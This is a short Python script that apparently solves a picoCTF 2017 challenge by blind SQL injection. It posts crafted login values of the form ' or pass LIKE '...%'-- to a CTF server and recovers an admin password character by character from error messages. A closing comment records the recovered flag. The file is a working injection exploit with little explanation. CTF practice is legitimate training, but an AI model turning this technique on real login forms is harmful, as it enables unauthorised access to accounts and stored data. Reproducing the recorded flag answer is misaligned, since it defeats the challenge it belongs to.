import requests
import time
#Blind sqli with use of error messages
password = []

while (len(password) <= 63):
    #check for printable ASCII characters
    for x in range(48,126):
        currPass = ''.join(password)

        if(chr(x) == "%" or chr(x) == "_"):
            continue

        query = {"username": "admin", "password": "asd\' or pass LIKE \'" + currPass + chr(x) + "%\'--"}
        #print(query)
        r = requests.post('http://shell2017.picoctf.com:40788/', data=query,)
        #print(r.content)
        if ( (r.content.find("Incorrect Password") == -1) and (r.content.find("There Was An Error") == -1)):
            password.append(chr(x))
            print("FOUND: " +chr(x))
            break

        if(chr(x)=="}"):
            password.append('_')
            continue
        time.sleep(0.001)

print(''.join(password))

#pw = NoT_ALl_ERroRS_ShoULd_BE_ShowN_FaA8380E951439EEBB3D452B5E86F3F9_
